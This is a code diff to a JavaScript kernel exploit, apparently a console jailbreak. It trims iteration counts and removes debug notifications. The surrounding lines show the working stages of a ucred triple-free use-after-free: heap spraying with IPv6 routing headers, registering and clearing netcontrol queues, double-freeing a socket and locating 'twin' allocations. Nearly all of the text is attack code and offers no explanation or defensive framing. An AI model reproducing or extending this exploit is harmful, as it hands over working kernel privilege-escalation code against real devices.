@@ -117,9 +117,9 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 5;
+var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 5;
-var MAX_ROUNDS_TWIN = 10;
+var MAX_ROUNDS_TWIN = 7;
 var MAX_ROUNDS_TRIPLET = 150;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
@@ -695,7 +695,6 @@ function setup() {
 
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     if (spray_rthdr_len <= 0) {
-      send_notification('SETUP FAIL: build_rthdr main <= 0');
       cleanup(true);
       return false;
     }
@@ -711,7 +710,6 @@ function setup() {
 
     var dummyBuffer = malloc(0x1000);
     if (!dummyBuffer) {
-      send_notification('SETUP FAIL: malloc dummyBuffer');
       cleanup(true);
       return false;
     }
@@ -731,7 +729,6 @@ function setup() {
     for (var s = 0; s < ipv6_socks.length; s++) {
       ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
       if (ipv6_socks[s].eq(BigInt_Error)) {
-        send_notification('SETUP FAIL: ipv6 socket idx=' + s);
         cleanup(true);
         return false;
       }
@@ -759,22 +756,18 @@ function setup() {
 
     init_threading();
     if (!create_workers()) {
-      send_notification('SETUP FAIL: create_workers');
       cleanup(true);
       return false;
     }
 
     if (!init_workers()) {
-      send_notification('SETUP FAIL: init_workers');
       cleanup(true);
       return false;
     }
 
     debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
-    send_notification('SETUP OK');
     return true;
   } catch (e) {
-    send_notification('SETUP EXCEPTION: ' + e);
     cleanup(true);
     return false;
   }
@@ -1469,46 +1462,35 @@ function trigger_ucred_triplefree() {
     main_count++;
 
     // 1) فتح سوكت الإدارة وتسجيله في netcontrol
-    send_notification("[T] opening main_socket");
     var main_socket = socket(AF_UNIX, SOCK_STREAM, 0);
     if (main_socket.eq(BigInt_Error)) {
       continue;
     }
-    send_notification("[T] main_socket ready");
 
     // 2) تسجيل السوكت في netcontrol ثم تخصيص ucred جديد
-    send_notification("[T] registering main_socket");
     write32(nc_set_buf, Number(main_socket.and(0xFFFFFFFF)));
     nc_call(NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
 
     setuid(1);
-    send_notification("[T] ucred allocated");
 
     // 3) فتح سوكت جديد (uaf_socket)
-    send_notification("[T] opening uaf_socket");
     var tmp_sock = socket(AF_UNIX, SOCK_STREAM, 0);
     if (tmp_sock.eq(BigInt_Error)) {
       log("[TRIGGER] uaf_socket error, retry");
       continue;
     }
     uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
-    send_notification("[T] uaf_socket ready");
 
     // 4) تحرير ucred السابق
     setuid(1);
-    send_notification("[T] freeing previous ucred");
 
     // 5) إلغاء التسجيل من netcontrol باستخدام نفس السوكت الأساسي
-    send_notification("[T] clearing queue");
 
     write32(nc_clear_buf, Number(main_socket.and(0xFFFFFFFF)));
     nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
-    send_notification("[T] queue cleared");
-
     // إغلاق السوكت الأساسي بعد الانتهاء
     close(main_socket);
-    send_notification("[T] main_socket closed");
 
     // 6) refcount fix loop
     send_notification("[T] refcount fix loop");
@@ -1522,12 +1504,10 @@ function trigger_ucred_triplefree() {
 
     // 7) first double-free
     close(dup(new BigInt(uaf_socket)));
-    send_notification("[T] first free done");
 
     // 8) find twins
     send_notification("[T] searching twins");
     end = find_twins();
-    send_notification("[T] twins found");
 
     if (!end) {
       log("[TRIGGER] step 8: no twins, cleanup & retry");
@@ -1536,9 +1516,8 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-
     log("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
-    
+    send_notification("[T] twins found");  
     
     // 9) free one twin
     send_notification("[T] freeing twin header");
